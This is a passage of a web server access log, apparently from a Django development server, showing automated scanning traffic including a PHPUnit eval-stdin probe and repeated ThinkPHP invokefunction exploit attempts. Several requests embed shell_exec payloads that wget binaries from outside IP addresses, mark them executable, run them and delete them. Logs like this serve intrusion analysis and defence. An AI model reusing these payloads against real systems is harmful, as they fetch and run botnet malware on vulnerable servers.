+[05/Jun/2023 08:01:25] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 3251
+[05/Jun/2023 08:01:26,862] - Broken pipe from ('139.60.150.14', 38274)
+[05/Jun/2023 08:01:26,870] - Broken pipe from ('69.162.243.124', 50246)
+[05/Jun/2023 08:01:26,890] - Broken pipe from ('178.128.84.187', 42010)
+[05/Jun/2023 08:01:26,890] - Broken pipe from ('178.128.84.187', 49460)
+[05/Jun/2023 08:01:26] "GET /static/encyclopedia/styles.css HTTP/1.1" 200 409
+[05/Jun/2023 08:01:26,890] - Broken pipe from ('178.128.84.187', 60222)
+[05/Jun/2023 08:01:26,900] - Broken pipe from ('65.49.20.67', 60712)
+[05/Jun/2023 08:01:26,900] - Broken pipe from ('65.49.20.67', 25844)
+[05/Jun/2023 08:01:26,900] - Broken pipe from ('138.68.153.47', 32910)
+[05/Jun/2023 08:01:26] "GET /static/encyclopedia/styles.css HTTP/1.1" 200 409
+[05/Jun/2023 08:01:26,910] - Broken pipe from ('138.68.153.47', 41022)
+[05/Jun/2023 08:01:26] "GET /human.aspx HTTP/1.1" 404 3127
+[05/Jun/2023 08:01:26,910] - Broken pipe from ('146.190.119.114', 57548)
+[05/Jun/2023 08:01:26,910] - Broken pipe from ('146.190.119.114', 56378)
+[05/Jun/2023 08:01:26] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://164.68.115.154/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
+[05/Jun/2023 08:01:26] "GET /static/encyclopedia/styles.css HTTP/1.1" 200 409
+[05/Jun/2023 08:01:26] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://164.68.115.154/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
+[05/Jun/2023 08:01:27] " P¼Òã " 400 -
+[05/Jun/2023 08:01:27] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://164.68.115.154/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
+[05/Jun/2023 08:01:27] You're accessing the development server over HTTPS, but it only supports HTTP.
+[05/Jun/2023 08:01:27] You're accessing the development server over HTTPS, but it only supports HTTP.
+[05/Jun/2023 08:01:27] You're accessing the development server over HTTPS, but it only supports HTTP.
+[05/Jun/2023 08:01:27] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= 'wget http://45.131.111.241/Yboats.x86 -O /tmp/.SHINJI; chmod 777 /tmp/.SHINJI; /tmp/.SHINJI thinkphp.selfrep' HTTP/1.1" 400 -
+[05/Jun/2023 08:01:27,037] - Broken pipe from ('180.225.13.60', 1300)
+[05/Jun/2023 08:01:27,047] - Broken pipe from ('192.168.0.1', 50416)
+[05/Jun/2023 08:01:27,047] - Broken pipe from ('192.168.0.1', 50576)
+[05/Jun/2023 08:01:27] "GET /index.php?s=/index/        hinkpp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://109.205.213.7/bins/UnHAnaAW.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" 400 -
+[05/Jun/2023 08:01:27,047] - Broken pipe from ('119.186.67.250', 42164)
+[05/Jun/2023 08:01:27,057] - Broken pipe from ('45.227.254.48', 65124)
+[05/Jun/2023 08:01:27,082] - Broken pipe from ('146.190.119.114', 40288)
